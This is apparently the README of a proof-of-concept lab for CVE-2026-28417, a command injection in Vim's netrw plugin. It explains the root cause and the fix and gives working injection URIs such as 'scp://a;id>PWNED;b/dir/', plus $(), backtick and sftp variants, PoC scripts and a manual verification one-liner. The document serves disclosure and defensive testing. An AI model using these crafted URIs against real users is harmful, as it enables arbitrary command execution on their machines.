# CVE-2026-28417 - Vim netrw OS Command Injection

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

## Vulnerability Summary

| Field | Value |
|---|---|
| CVE | CVE-2026-28417 |
| Component | [Vim](https://github.com/vim/vim) (netrw plugin) |
| Type | CWE-78: OS Command Injection |
| CVSS | 4.4 (Medium) — `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N` |
| Affected | All Vim versions before v9.2.0073 (with netrw plugin loaded) |
| Fix | [v9.2.0073](https://github.com/vim/vim/releases/tag/v9.2.0073) — strict hostname validation + `shellescape()` |
| Advisory | [GHSA-m3xh-9434-g336](https://github.com/vim/vim/security/advisories/GHSA-m3xh-9434-g336) |
| Researcher | ehdgks0627, un3xploitable |
| Author | Exploit Intelligence Platform |
| Date | 2026-02-28 |

## Vulnerability Details

An OS command injection vulnerability exists in the **netrw** file browser plugin bundled with Vim. The vulnerability has two cooperating root causes:

**Part 1 — Insufficient hostname validation.** The function `s:NetrwValidateHostname()` uses a weak, unanchored regular expression that only checks whether a hostname starts with an alphanumeric character:

```vim
function s:NetrwValidateHostname(hostname)
    return a:hostname =~? '^[a-z0-9]'
endfunction
```

A hostname like `a;id>PWNED;b` passes validation because it starts with `a`.

**Part 2 — Unescaped shell command construction.** The function `s:MakeSshCmd()` substitutes hostnames directly into shell commands without `shellescape()`:

```vim
let sshcmd = substitute(a:sshcmd,'\<HOSTNAME\>',s:machine,'')
```

Together, these flaws allow an attacker to craft a netrw URI (e.g., `scp://a;COMMAND;b/dir/`) that executes arbitrary shell commands when a user opens it in Vim.

### Attack Chain

```
1. Craft URI:    scp://a;id>PWNED;b/dir/
2. User opens:   vim -c ':e scp://a;id>PWNED;b/dir/'
3. Validation:   '^[a-z0-9]' matches leading 'a' — passes
4. MakeSshCmd:   ssh  a;id>PWNED;b ls -FLa
5. Shell exec:   ssh a (fails) ; id>PWNED (RCE!) ; b ls -FLa (fails)
```

### Exploitation Constraints

| Constraint | Details |
|---|---|
| No `/` in hostname | netrw URL parser terminates hostname at `/` |
| No `#` or `:` in hostname | Also terminate hostname parsing |
| No `\|` via ex-commands | Vim's ex-command parser intercepts `\|` as command separator |
| User interaction required | Victim must open the crafted URI in Vim |
| `openssh-client` required | netrw needs `ssh`/`scp` on PATH to construct remote commands |

### Multiple Injection Vectors

| Vector | Metacharacter | Payload | Status |
|---|---|---|---|
| Semicolon | `;` | `scp://a;id>MARKER;b/dir/` | Confirmed |
| Command substitution | `$()` | `scp://a$(id>MARKER)b/dir/` | Confirmed |
| SFTP protocol | `;` | `sftp://a;whoami>MARKER;b/dir/` | Confirmed |
| Backtick | `` ` `` | `` scp://a`id>MARKER`b/dir/ `` | Confirmed |
| Pipe | `\|` | `scp://a\|id>MARKER\|b/dir/` | Failed (Vim intercepts `\|`) |

## Lab Setup

### Architecture

```
┌──────────────────────────────────────────────────┐
│  cve-2026-28417-vulnerable                       │
│                                                  │
│  Vim 9.2 (patches 1-72) + netrw (vulnerable)    │
│  openssh-client (required by netrw)              │
│  Debian bookworm-slim                            │
│                                                  │
│  No ports — client-side vulnerability            │
│  Container runs: sleep infinity                  │
│  PoC executes via: docker exec                   │
└──────────────────────────────────────────────────┘
```

### Quick Start

```bash
cd CVE-2026-28417

# Build and start the container
docker compose build
docker compose up -d

# Run the primary PoC
python3 poc/poc.py

# Run alternative vectors
python3 poc/poc_vector2_subshell.py
python3 poc/poc_vector3_sftp.py
python3 poc/poc_vector4_backtick.py

# Cleanup
docker compose down
```

### Container Details

| Container | Role | Base | Description |
|---|---|---|---|
| `cve-2026-28417-vulnerable` | Vulnerable target | `debian:bookworm-slim` | Vim v9.2.0072, netrw with weak hostname validation |

## PoC Usage

Five PoC scripts are provided, all using **Python 3 stdlib only** (no external dependencies). All scripts communicate with the container via `docker exec`.

### PoC 1: Semicolon Command Injection (`poc.py`)

The primary exploit. Injects `id` command via semicolon-separated hostname in a crafted `scp://` URI.

```bash
python3 poc/poc.py                          # Default container name
python3 poc/poc.py <container_name>         # Custom container name
```

### Expected Output (Vulnerable)

```
======================================================================
  CVE-2026-28417: Vim netrw OS Command Injection PoC
======================================================================

  Target container: cve-2026-28417-vulnerable
  Marker file:     CVE-2026-28417-xxxxxxxx

[*] Step 1: Checking container is running...
[+] Container 'cve-2026-28417-vulnerable' is running.

[*] Step 2: Checking Vim version...
[+] Vim version: VIM - Vi IMproved 9.2 (2026 Feb 14, compiled ...)

[*] Step 3: Checking if netrw has vulnerable hostname validation...
[+] Vulnerable regex pattern found: '^[a-z0-9]' (unanchored, no end check)

[*] Step 4: Executing semicolon-based command injection...
--------------------------------------------------
[*] Payload: scp://a;id>CVE-2026-28417-xxxxxxxx;b/dir/
[*] Expected command: ssh  a;id>CVE-2026-28417-xxxxxxxx;b ls -FLa

[*] Executing Vim with crafted netrw URI inside container...
[+] VULNERABLE! Marker file created with contents:
    uid=0(root) gid=0(root) groups=0(root)
--------------------------------------------------

======================================================================
[+] RESULT: VULNERABLE — CVE-2026-28417 CONFIRMED
======================================================================
```

### PoC 2: Command Substitution (`poc_vector2_subshell.py`)

Demonstrates the same injection using `$()` command substitution syntax.

```bash
python3 poc/poc_vector2_subshell.py
```

### PoC 3: SFTP Protocol Injection (`poc_vector3_sftp.py`)

Proves the vulnerability is protocol-independent — works via `sftp://` as well as `scp://`.

```bash
python3 poc/poc_vector3_sftp.py
```

### PoC 4: Backtick Injection (`poc_vector4_backtick.py`)

Legacy shell command substitution using backticks.

```bash
python3 poc/poc_vector4_backtick.py
```

### PoC 5: Pipe Injection (`poc_vector4_pipe.py`)

Attempts pipe-based injection. **This vector fails** because Vim's ex-command parser intercepts `|` as a command separator before the URI reaches netrw.

```bash
python3 poc/poc_vector4_pipe.py
```

### Quick Manual Verification

```bash
docker exec cve-2026-28417-vulnerable bash -c '
cd /workspace && rm -f PWNED
timeout 15 vim --clean \
    -c "packadd netrw" \
    -c "e scp://a;id>PWNED;b/dir/" \
    -c "qa!" \
    </dev/null >/dev/null 2>&1 || true
cat PWNED 2>/dev/null && echo "=== VULNERABLE ===" || echo "=== NOT VULNERABLE ==="
'
```

## Verification: Vulnerable vs Patched

| Step | Vulnerable (v9.2.0072) | Patched (v9.2.0073+) |
|---|---|---|
| Semicolon injection | Marker file created — RCE confirmed | `Rejecting invalid hostname` — blocked |
| `$()` substitution | Marker file created — RCE confirmed | Blocked by strict validation |
| Backtick injection | Marker file created — RCE confirmed | Blocked by strict validation |
| SFTP injection | Marker file created — RCE confirmed | Blocked by strict validation |
| `shellescape()` applied | No | Yes — defense-in-depth |

## Fix Details

**Commit:** [`79348dbbc`](https://github.com/vim/vim/commit/79348dbbc09332130f4c86045e1541d68514fcc1) (patch 9.2.0073)

The fix provides defense-in-depth with two layers:

**Layer 1 — Strict hostname validation:** `s:NetrwValidateHostname()` now uses an anchored, RFC 1123-compliant regex that restricts hostnames to `[a-zA-Z0-9.-]`, blocking all shell metacharacters.

**Layer 2 — Shell escaping:** `s:MakeSshCmd()` wraps all substituted values in `shellescape()`, preventing command injection even if validation were bypassed.

## Files

| File | Description |
|---|---|
| `poc/poc.py` | Primary PoC — semicolon command injection via `scp://` URI |
| `poc/poc_vector2_subshell.py` | Vector 2 — `$()` command substitution injection |
| `poc/poc_vector3_sftp.py` | Vector 3 — SFTP protocol injection (protocol-independent) |
| `poc/poc_vector4_backtick.py` | Vector 4 — backtick command injection |
| `poc/poc_vector4_pipe.py` | Vector 5 — pipe injection (fails — Vim intercepts `|`) |
| `test_vuln.sh` | In-container verification script |
| `Dockerfile.vulnerable` | Vim v9.2.0072 built from source (multi-stage) |
| `docker-compose.yml` | Single-container lab orchestration |
| `intel_brief.md` | CVE intelligence brief |
| `vulnerability_analysis.md` | Root cause analysis |
| `lab_build_report.md` | Lab build documentation |
| `poc_verification_report.md` | PoC test results |

## References

- [Fix Commit](https://github.com/vim/vim/commit/79348dbbc09332130f4c86045e1541d68514fcc1) (patch 9.2.0073)
- [GitHub Security Advisory GHSA-m3xh-9434-g336](https://github.com/vim/vim/security/advisories/GHSA-m3xh-9434-g336)
- [Release v9.2.0073](https://github.com/vim/vim/releases/tag/v9.2.0073)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2026-28417)
- [Vim Repository](https://github.com/vim/vim)

## Timeline

| Date | Event |
|---|---|
| 2026-02-22 | Fix committed by Christian Brabandt (patch 9.2.0073) |
| 2026-02-28 | CVE-2026-28417 assigned |
| 2026-02-28 | Lab reproduction and PoC verification completed |

## Disclaimer

This proof-of-concept is provided for **authorized security testing and educational purposes only**. It is intended to help defenders understand, detect, and remediate CVE-2026-28417 in their environments.

**Do not** use this tool against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions and may violate laws including the Computer Fraud and Abuse Act (CFAA), the Computer Misuse Act, and equivalent legislation worldwide.

The authors assume no liability for misuse of this material. This project follows responsible disclosure practices.
